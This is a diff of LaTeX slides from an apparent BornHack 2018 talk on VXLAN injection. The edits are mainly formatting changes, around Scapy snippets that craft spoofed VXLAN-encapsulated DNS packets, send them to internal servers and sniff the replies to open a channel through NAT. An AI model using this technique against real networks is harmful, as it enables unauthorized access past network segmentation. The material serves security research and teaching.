@@ -5,6 +5,7 @@
 %\usepackage[normalem]{ulem}
 
 \usepackage{multicol}
+\usepackage{tikz}
 
 % VXLAN Security or Injection
 % BornHack 2018 regular talk
@@ -16,6 +17,7 @@
 
 % Keywords:
 % VXLAN injection
+
 
 
 \begin{document}
@@ -173,7 +175,7 @@ Tested working with Clavister with DNS UDP probes/requests, no inspection }
 \slide{Snippets of Scapy}
 
 First create VXLAN header and inside packet
-\begin{python}\ttm
+\begin{minted}[fontsize=\small]{python}
 vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
 vni=37             # Usually VNI == destination VLAN {\bf
 vxlan=Ether(dst=routermac)/IP(src=vtepsrc,dst=vtepdst)/
@@ -187,10 +189,10 @@ destination="10.0.0.10"
 insideport=53
 # this port is a high port, just make this look like a normal request
 testport=54040
-packet={\bf vxlan}/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
+packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
     dst=destination)/UDP(sport=testport,dport=insideport)/
     DNS(rd=1,id=0xdead,qd=DNSQR(qname="www.wikipedia.org"))
-\end{python}
+\end{minted}
 
 {\small Fun fact, Unbound on OpenBSD reply to DNS requests received in Ethernet packets with broadcast destination and IP destination being the IP of the server - confirmed normal IP stack behaviour}
 
@@ -199,7 +201,7 @@ packet={\bf vxlan}/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
 
 Send and then wait for something, not from same IP bc from\\
 inside NAT, but port should be OK
-\begin{python}\footnotesize
+\begin{minted}[fontsize=\small]{python}
 pid = os.fork()
 if pid:
     # we are the parent
@@ -214,7 +216,7 @@ else:
     print "child: closing"
     sys.exit(0)
 data[0].show()
-\end{python}
+\end{minted}
 
 The source port we used in the inside packet, becomes the destination port in replies from the server - 54040 in example
 
@@ -245,7 +247,7 @@ reverse UDP requests coming into internal server
 \slide{Send and receive - do another request}
 
 Send/receive UDP probe, do another request through the open channel
-\begin{python}\footnotesize
+\begin{minted}[fontsize=\small]{python}
 ...
 print "After fork and things"
 #print data.summary()
@@ -261,7 +263,7 @@ packet=Ether(dst=routermac)/IP(src=attacker,dst=ip.src)/
     UDP(sport=udp.dport,dport=udp.sport)/DNS(rd=1,qd=DNSQR(qname="localhost"))
 sendp(packet,loop=0)
 ...
-\end{python}
+\end{minted}
 
 Maybe abuse complex protocols such as FTP, SIP etc. to open arbitrary ports?
 
